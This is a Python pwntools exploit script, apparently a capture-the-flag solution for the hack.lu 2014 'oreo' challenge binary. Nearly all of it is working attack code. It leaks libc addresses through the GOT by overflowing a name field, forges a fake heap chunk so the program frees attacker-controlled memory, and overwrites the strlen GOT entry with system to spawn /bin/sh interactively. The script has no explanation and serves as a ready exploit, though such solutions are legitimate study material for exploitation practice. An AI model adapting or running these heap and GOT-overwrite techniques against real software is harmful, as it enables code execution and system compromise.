from pwn import *

context.log_level = 'debug'
context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
p =  process('./hack-lu2014_oreo')
elf = ELF('./hack-lu2014_oreo')
libc = ELF('/lib/i386-linux-gnu/libc-2.19.so')

def add(name, description):
	p.sendline('1')
	p.sendline(name)
	p.sendline(description)

def show():
	p.sendline('2')
	p.recvuntil('=\n')

def free():
	p.sendline('3')

def leaveMsg(msg):
	p.sendline('4')
	p.sendline(msg)

def leak(addr):
	add('a'*27 + p32(addr), 'a')
	show()
	p.recvuntil('Description: ')
	p.recvuntil('Description: ')
	res = u32(p.recvuntil('\n', drop=True)[:4])
	p.recvuntil('\n')
	return res

libc_base = leak(elf.got['puts']) - libc.symbols['puts']
system = libc_base + libc.symbols['system']
print "libc_base : %#x" % libc_base
print "system : %#x" % system

for _ in range(0x40-1):
	add('a', 'a')
add('a'*27 + p32(0x0804A2A8), 'a')

payload = '\x00'*0x20 + p32(0x40) + p32(0x50)
leaveMsg(payload)
free()

p.recvuntil('Okay order submitted!\n')

add('a' ,p32(elf.got['strlen']))
gdb.attach(p)
leaveMsg(p32(system) + ';/bin/sh')
#gdb.attach(p)

p.interactive()


